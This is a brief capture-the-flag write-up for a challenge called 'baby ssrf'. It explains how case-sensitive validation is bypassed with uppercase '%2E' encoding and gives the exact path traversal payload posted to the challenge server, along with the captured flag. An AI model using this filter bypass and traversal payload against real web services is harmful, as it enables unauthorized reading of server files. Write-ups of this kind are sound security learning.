# baby ssrf

Source code was available at `http://82.196.12.132:12999/source` (found with dirb)

Validation is case sensitive, so we can use `%2E` instead of `%2e` and bypass the filter.

Post `document_name=%2E%2E/flag` to `http://82.196.12.132:12999/open` to get the flag.

Flag is `ASIS{68aaf2e4dd0e7ba28622aaed383bef4f}`